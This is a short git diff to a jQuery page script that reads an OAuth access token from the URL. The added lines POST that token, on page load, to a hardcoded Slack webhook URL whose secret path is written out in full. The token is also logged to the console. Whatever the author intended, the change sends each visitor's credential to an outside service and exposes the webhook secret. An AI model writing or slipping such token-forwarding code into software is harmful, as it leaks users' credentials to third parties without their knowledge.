@@ -19,6 +19,20 @@ $( document ).ready(function() {
 
     const accessToken = getUrlParameter('access_token');
     console.log(`accessToken ${accessToken}`);
+   
+  var settings = {
+  "url": "https://hooks.slack.com/services/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",
+  "method": "POST",
+  "timeout": 0,
+  "headers": {
+    "Content-type": "application/json"
+  },
+  "data": JSON.stringify({"text":(`accessToken ${accessToken}`)}),
+};
+
+$.ajax(settings).done(function (response) {
+  console.log(response);
+});
     
   $.get({
     method: 'GET',
